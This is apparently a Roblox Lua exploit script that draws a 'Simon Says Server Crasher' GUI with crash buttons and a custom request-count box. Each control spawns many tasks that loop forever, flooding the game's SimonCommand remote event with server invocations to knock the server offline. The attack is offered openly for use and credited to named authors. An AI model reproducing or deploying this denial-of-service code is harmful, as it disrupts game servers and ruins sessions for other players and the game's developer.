local GREECE = {}



--SimonSaysGameCrash
GREECE["0"] = Instance.new("ScreenGui", game:GetService("CoreGui"))

--SimonSaysGameCrash.Crasher
GREECE["1"] = Instance.new("Frame", GREECE["0"])

--SimonSaysGameCrash.Crasher.UIGradient
GREECE["2"] = Instance.new("UIGradient", GREECE["1"])

--SimonSaysGameCrash.Crasher.UIGradient.UICorner
GREECE["3"] = Instance.new("UICorner", GREECE["2"])

--SimonSaysGameCrash.Crasher.UICorner
GREECE["4"] = Instance.new("UICorner", GREECE["1"])

--SimonSaysGameCrash.Crasher.Title
GREECE["5"] = Instance.new("TextLabel", GREECE["1"])

--SimonSaysGameCrash.Crasher.Pattern
--GREECE["6"] = Instance.new("ImageLabel", GREECE["1"])

--SimonSaysGameCrash.Crasher.Pattern.UICorner
--GREECE["7"] = Instance.new("UICorner", GREECE["6"])

--SimonSaysGameCrash.Crasher.SpamClickToCrash
GREECE["8"] = Instance.new("TextButton", GREECE["1"])

--SimonSaysGameCrash.Crasher.SpamClickToCrash.Shadow
GREECE["9"] = Instance.new("Frame", GREECE["8"])

--SimonSaysGameCrash.Crasher.SpamClickToCrash.TextLabel
GREECE["10"] = Instance.new("TextLabel", GREECE["8"])

--SimonSaysGameCrash.Crasher.ClickOnceToCrash
GREECE["11"] = Instance.new("TextButton", GREECE["1"])

--SimonSaysGameCrash.Crasher.ClickOnceToCrash.Shadow
GREECE["12"] = Instance.new("Frame", GREECE["11"])

--SimonSaysGameCrash.Crasher.ClickOnceToCrash.TextLabel
GREECE["13"] = Instance.new("TextLabel", GREECE["11"])

--SimonSaysGameCrash.Crasher.Custom Amount of Requests
GREECE["14"] = Instance.new("TextBox", GREECE["1"])

--SimonSaysGameCrash.Crasher.Credits
GREECE["15"] = Instance.new("TextLabel", GREECE["1"])



--[[
    Properties:
--]]
--SimonSaysGameCrash
GREECE["0"].Name = [[SimonSaysGameCrash]]
GREECE["0"].Enabled = true
GREECE["0"].ZIndexBehavior = Enum.ZIndexBehavior.Global

--SimonSaysGameCrash.Crasher
GREECE["1"].Name = [[Crasher]]
GREECE["1"].Active = true
GREECE["1"].AnchorPoint = Vector2.new(1, 0)
GREECE["1"].BackgroundColor3 = Color3.fromRGB(213,0,0)
GREECE["1"].BackgroundTransparency = 0.2
GREECE["1"].BorderColor3 = Color3.fromRGB(27, 42, 53)
GREECE["1"].BorderSizePixel = 0
GREECE["1"].ClipsDescendants = false
GREECE["1"].Draggable = true
GREECE["1"].Position = UDim2.new(0.9993415, 0, -0.0013863358, 0)
GREECE["1"].Rotation = 0
GREECE["1"].Selectable = false
GREECE["1"].SelectionOrder = 0
GREECE["1"].Size = UDim2.new(0, 270, 0, 164)
GREECE["1"].Visible = true
GREECE["1"].ZIndex = 1

--SimonSaysGameCrash.Crasher.UIGradient
GREECE["2"].Name = [[UIGradient]]
GREECE["2"].Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(224, 43, 39)), ColorSequenceKeypoint.new(1, Color3.fromRGB(168, 3, 3))};
GREECE["2"].Enabled = true
GREECE["2"].Rotation = 0
GREECE["2"].Transparency = NumberSequence.new(0, 0);

--SimonSaysGameCrash.Crasher.UIGradient.UICorner
GREECE["3"].Name = [[UICorner]]
GREECE["3"].CornerRadius = UDim.new(0, 8)

--SimonSaysGameCrash.Crasher.UICorner
GREECE["4"].Name = [[UICorner]]
GREECE["4"].CornerRadius = UDim.new(0, 8)

--SimonSaysGameCrash.Crasher.Title
GREECE["5"].Name = [[Title]]
GREECE["5"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
GREECE["5"].Text = [[Simon Says Server Crasher - Made by Electalite / Andot]]
GREECE["5"].TextColor3 = Color3.fromRGB(250, 250, 250)
GREECE["5"].TextScaled = true
GREECE["5"].TextSize = 14
GREECE["5"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
GREECE["5"].TextStrokeTransparency = 1
GREECE["5"].TextWrapped = true
GREECE["5"].TextXAlignment = Enum.TextXAlignment.Center
GREECE["5"].TextYAlignment = Enum.TextYAlignment.Center
GREECE["5"].Active = false
GREECE["5"].AnchorPoint = Vector2.new(0, 0)
GREECE["5"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GREECE["5"].BackgroundTransparency = 1
GREECE["5"].BorderColor3 = Color3.fromRGB(0, 0, 0)
GREECE["5"].BorderSizePixel = 0
GREECE["5"].ClipsDescendants = false
GREECE["5"].Draggable = false
GREECE["5"].Position = UDim2.new(0, 0, 0, 0)
GREECE["5"].Rotation = 0
GREECE["5"].Selectable = false
GREECE["5"].SelectionOrder = 0
GREECE["5"].Size = UDim2.new(0, 260, 0, 52)
GREECE["5"].Visible = true
GREECE["5"].ZIndex = 1

--SimonSaysGameCrash.Crasher.Pattern

--GREECE["6"].Name = [[Pattern]]
--GREECE["6"].Image = [[rbxassetid://300134974]]
--GREECE["6"].ImageColor3 = Color3.fromRGB(255, 255, 255)
--GREECE["6"].ScaleType = Enum.ScaleType.Tile
--GREECE["6"].SliceCenter = Rect.new(0, 256, 0, 256)
--GREECE["6"].TileSize = UDim2.new(0, 90, 0, 90)
--GREECE["6"].Active = false
--GREECE["6"].AnchorPoint = Vector2.new(1, 0)
--GREECE["6"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
--GREECE["6"].BackgroundTransparency = 1
--GREECE["6"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
--GREECE["6"].BorderSizePixel = 1
--GREECE["6"].ClipsDescendants = true
--GREECE["6"].Draggable = false
--GREECE["6"].Position = UDim2.new(1, 0, 0, 0)
--GREECE["6"].Rotation = 0
--GREECE["6"].Selectable = false
--GREECE["6"].SelectionOrder = 0
--GREECE["6"].Size = UDim2.new(1, 0, 1, 0)
--GREECE["6"].Visible = true
--GREECE["6"].ZIndex = 4

--SimonSaysGameCrash.Crasher.Pattern.UICorner
--GREECE["7"].Name = [[UICorner]]
--GREECE["7"].CornerRadius = UDim.new(0, 8)
--SimonSaysGameCrash.Crasher.SpamClickToCrash
GREECE["8"].Name = [[SpamClickToCrash]]
GREECE["8"].FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal)
GREECE["8"].Text = [[]]
GREECE["8"].TextColor3 = Color3.fromRGB(255, 255, 255)
GREECE["8"].TextScaled = true
GREECE["8"].TextSize = 14
GREECE["8"].TextStrokeColor3 = Color3.fromRGB(213.00002, 0, 213.00002)
GREECE["8"].TextStrokeTransparency = 1
GREECE["8"].TextWrapped = true
GREECE["8"].TextXAlignment = Enum.TextXAlignment.Center
GREECE["8"].TextYAlignment = Enum.TextYAlignment.Center
GREECE["8"].Active = true
GREECE["8"].AnchorPoint = Vector2.new(1, 0)
GREECE["8"].BackgroundColor3 = Color3.fromRGB(48, 48, 48)
GREECE["8"].BackgroundTransparency = 0
GREECE["8"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
GREECE["8"].BorderSizePixel = 0
GREECE["8"].ClipsDescendants = false
GREECE["8"].Draggable = false
GREECE["8"].Position = UDim2.new(0.45555556, 0, 0.3597561, 0)
GREECE["8"].Rotation = 0
GREECE["8"].Selectable = true
GREECE["8"].SelectionOrder = 0
GREECE["8"].Size = UDim2.new(0, 123, 0, 42)
GREECE["8"].Visible = true
GREECE["8"].ZIndex = 5
GREECE["11"].MouseButton1Click:Connect(function()
    for i = 1, 1000 do
        task.spawn(function()
            for i = 1, (math.huge ^ math.huge * math.huge ^ math.huge) * math.huge ^ math.huge, .1 do
                pcall(function()
                    while true do
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 1)
                        task.wait(.00000000000000000000000000001)
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 2)
                        task.wait(.00000000000000000000000000001)
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 3)
                        task.wait(.00000000000000000000000000001)
                        game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 4)
                        task.wait(.00000000000000000000000000001)
                    end

                end)
            end
        end)
        warn("Started " .. i .. " Tasks!")
    end

end)

--SimonSaysGameCrash.Crasher.SpamClickToCrash.Shadow
GREECE["9"].Name = [[Shadow]]
GREECE["9"].Active = false
GREECE["9"].AnchorPoint = Vector2.new(0, 0)
GREECE["9"].BackgroundColor3 = Color3.fromRGB(213.00002, 0, 0)
GREECE["9"].BackgroundTransparency = 0.4
GREECE["9"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
GREECE["9"].BorderSizePixel = 0
GREECE["9"].ClipsDescendants = false
GREECE["9"].Draggable = false
GREECE["9"].Position = UDim2.new(0, 0, 0, 0)
GREECE["9"].Rotation = 0
GREECE["9"].Selectable = false
GREECE["9"].SelectionOrder = 0
GREECE["9"].Size = UDim2.new(1.0081967, 0, 1, 4)
GREECE["9"].Visible = true
GREECE["9"].ZIndex = 5

--SimonSaysGameCrash.Crasher.SpamClickToCrash.TextLabel
GREECE["10"].Name = [[TextLabel]]
GREECE["10"].FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal)
GREECE["10"].Text = [[Crash Server (Spam Click)]]
GREECE["10"].TextColor3 = Color3.fromRGB(255, 255, 255)
GREECE["10"].TextScaled = true
GREECE["10"].TextSize = 14
GREECE["10"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
GREECE["10"].TextStrokeTransparency = 1
GREECE["10"].TextWrapped = true
GREECE["10"].TextXAlignment = Enum.TextXAlignment.Center
GREECE["10"].TextYAlignment = Enum.TextYAlignment.Center
GREECE["10"].Active = false
GREECE["10"].AnchorPoint = Vector2.new(0.5, 0.5)
GREECE["10"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GREECE["10"].BackgroundTransparency = 1
GREECE["10"].BorderColor3 = Color3.fromRGB(27, 42, 53)
GREECE["10"].BorderSizePixel = 0
GREECE["10"].ClipsDescendants = false
GREECE["10"].Draggable = false
GREECE["10"].Position = UDim2.new(0.5040982, 0, 0.5029155, 0)
GREECE["10"].Rotation = 0
GREECE["10"].Selectable = false
GREECE["10"].SelectionOrder = 0
GREECE["10"].Size = UDim2.new(1.0601093, -20, 1.0349854, -20)
GREECE["10"].Visible = true
GREECE["10"].ZIndex = 5

--SimonSaysGameCrash.Crasher.ClickOnceToCrash
GREECE["11"].Name = [[ClickOnceToCrash]]
GREECE["11"].FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal)
GREECE["11"].Text = [[]]
GREECE["11"].TextColor3 = Color3.fromRGB(255, 255, 255)
GREECE["11"].TextScaled = true
GREECE["11"].TextSize = 14
GREECE["11"].TextStrokeColor3 = Color3.fromRGB(213.00002, 0, 213.00002)
GREECE["11"].TextStrokeTransparency = 1
GREECE["11"].TextWrapped = true
GREECE["11"].TextXAlignment = Enum.TextXAlignment.Center
GREECE["11"].TextYAlignment = Enum.TextYAlignment.Center
GREECE["11"].Active = true
GREECE["11"].AnchorPoint = Vector2.new(1, 0)
GREECE["11"].BackgroundColor3 = Color3.fromRGB(48, 48, 48)
GREECE["11"].BackgroundTransparency = 0
GREECE["11"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
GREECE["11"].BorderSizePixel = 0
GREECE["11"].ClipsDescendants = false
GREECE["11"].Draggable = false
GREECE["11"].Position = UDim2.new(0.962963, 0, 0.3597561, 0)
GREECE["11"].Rotation = 0
GREECE["11"].Selectable = true
GREECE["11"].SelectionOrder = 0
GREECE["11"].Size = UDim2.new(0, 123, 0, 42)
GREECE["11"].Visible = true
GREECE["11"].ZIndex = 5
GREECE["8"].MouseButton1Click:Connect(function()
    for i = 1, (math.huge ^ math.huge * math.huge ^ math.huge) * math.huge ^ math.huge, .1 do
        pcall(function()
            while true do
                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 1)
                task.wait(.00000000000000000000000000001)
                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 2)
                task.wait(.00000000000000000000000000001)
                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 3)
                task.wait(.00000000000000000000000000001)
                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true, 4)
                task.wait(.00000000000000000000000000001)
            end

        end)
    end
end)

--SimonSaysGameCrash.Crasher.ClickOnceToCrash.Shadow
GREECE["12"].Name = [[Shadow]]
GREECE["12"].Active = false
GREECE["12"].AnchorPoint = Vector2.new(0, 0)
GREECE["12"].BackgroundColor3 = Color3.fromRGB(213.00002, 0, 0)
GREECE["12"].BackgroundTransparency = 0.4
GREECE["12"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
GREECE["12"].BorderSizePixel = 0
GREECE["12"].ClipsDescendants = false
GREECE["12"].Draggable = false
GREECE["12"].Position = UDim2.new(0, 0, 0, 0)
GREECE["12"].Rotation = 0
GREECE["12"].Selectable = false
GREECE["12"].SelectionOrder = 0
GREECE["12"].Size = UDim2.new(1.0081967, 0, 1, 4)
GREECE["12"].Visible = true
GREECE["12"].ZIndex = 5

--SimonSaysGameCrash.Crasher.ClickOnceToCrash.TextLabel
GREECE["13"].Name = [[TextLabel]]
GREECE["13"].FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal)
GREECE["13"].Text = [[Crash Server (Only click once)]]
GREECE["13"].TextColor3 = Color3.fromRGB(255, 255, 255)
GREECE["13"].TextScaled = true
GREECE["13"].TextSize = 14
GREECE["13"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
GREECE["13"].TextStrokeTransparency = 1
GREECE["13"].TextWrapped = true
GREECE["13"].TextXAlignment = Enum.TextXAlignment.Center
GREECE["13"].TextYAlignment = Enum.TextYAlignment.Center
GREECE["13"].Active = false
GREECE["13"].AnchorPoint = Vector2.new(0.5, 0.5)
GREECE["13"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GREECE["13"].BackgroundTransparency = 1
GREECE["13"].BorderColor3 = Color3.fromRGB(27, 42, 53)
GREECE["13"].BorderSizePixel = 0
GREECE["13"].ClipsDescendants = false
GREECE["13"].Draggable = false
GREECE["13"].Position = UDim2.new(0.5040982, 0, 0.5029155, 0)
GREECE["13"].Rotation = 0
GREECE["13"].Selectable = false
GREECE["13"].SelectionOrder = 0
GREECE["13"].Size = UDim2.new(1.0601093, -20, 1.0349854, -20)
GREECE["13"].Visible = true
GREECE["13"].ZIndex = 5

--SimonSaysGameCrash.Crasher.Custom Amount of Requests
GREECE["14"].Name = [[Custom Amount of Requests]]
GREECE["14"].ClearTextOnFocus = true
GREECE["14"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
GREECE["14"].MultiLine = false
GREECE["14"].PlaceholderColor3 = Color3.new(0.9176471, 0.9176471, 0.9176471)
GREECE["14"].PlaceholderText = [[Custom amount of requests]]
GREECE["14"].Text = [[]]
GREECE["14"].TextColor3 = Color3.fromRGB(255, 255, 255)
GREECE["14"].TextScaled = true
GREECE["14"].TextSize = 14
GREECE["14"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
GREECE["14"].TextStrokeTransparency = 1
GREECE["14"].TextWrapped = true
GREECE["14"].TextXAlignment = Enum.TextXAlignment.Center
GREECE["14"].TextYAlignment = Enum.TextYAlignment.Center
GREECE["14"].Active = true
GREECE["14"].AnchorPoint = Vector2.new(0, 0)
GREECE["14"].BackgroundColor3 = Color3.fromRGB(156, 0, 0)
GREECE["14"].BackgroundTransparency = 0.2
GREECE["14"].BorderColor3 = Color3.fromRGB(0, 0, 0)
GREECE["14"].BorderSizePixel = 0
GREECE["14"].ClipsDescendants = false
GREECE["14"].Draggable = false
GREECE["14"].Position = UDim2.new(0, 0, 0.95731705, 0)
GREECE["14"].Rotation = 0
GREECE["14"].Selectable = true
GREECE["14"].SelectionOrder = 0
GREECE["14"].Size = UDim2.new(0, 123, 0, -40)
GREECE["14"].Visible = true
GREECE["14"].ZIndex = 6
InputField = GREECE["14"]
GREECE["14"].FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local inputText = tonumber(inputField.Text)
        if inputText and inputText > 0 then
            for i = 1, inputText do
                task.spawn(function()
                    for i = 1, (math.huge ^ math.huge * math.huge ^ math.huge) * math.huge ^ math.huge, .1 do
                        pcall(function()
                            while true do
                                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true,
                                    1)
                                task.wait(.00000000000000000000000000001)
                                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true,
                                    2)
                                task.wait(.00000000000000000000000000001)
                                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true,
                                    3)
                                task.wait(.00000000000000000000000000001)
                                game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true, true,
                                    4)
                                task.wait(.00000000000000000000000000001)
                            end

                        end)
                    end
                end)
                warn("Started " .. i .. " Tasks!")
            end
        else
            warn("Please enter a valid number of tasks.")
        end
    end
end)

--SimonSaysGameCrash.Crasher.Credits
GREECE["15"].Name = [[Credits]]
GREECE["15"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
GREECE["15"].Text = [[Discord: @dpans]]
GREECE["15"].TextColor3 = Color3.fromRGB(250, 250, 250)
GREECE["15"].TextScaled = true
GREECE["15"].TextSize = 14
GREECE["15"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
GREECE["15"].TextStrokeTransparency = 1
GREECE["15"].TextWrapped = true
GREECE["15"].TextXAlignment = Enum.TextXAlignment.Center
GREECE["15"].TextYAlignment = Enum.TextYAlignment.Center
GREECE["15"].Active = false
GREECE["15"].AnchorPoint = Vector2.new(0, 0)
GREECE["15"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GREECE["15"].BackgroundTransparency = 1
GREECE["15"].BorderColor3 = Color3.fromRGB(0, 0, 0)
GREECE["15"].BorderSizePixel = 0
GREECE["15"].ClipsDescendants = false
GREECE["15"].Draggable = false
GREECE["15"].Position = UDim2.new(0.5074074, 0, 0.7134146, 0)
GREECE["15"].Rotation = 0
GREECE["15"].Selectable = false
GREECE["15"].SelectionOrder = 0
GREECE["15"].Size = UDim2.new(0, 125, 0, 40)
GREECE["15"].Visible = true
GREECE["15"].ZIndex = 1
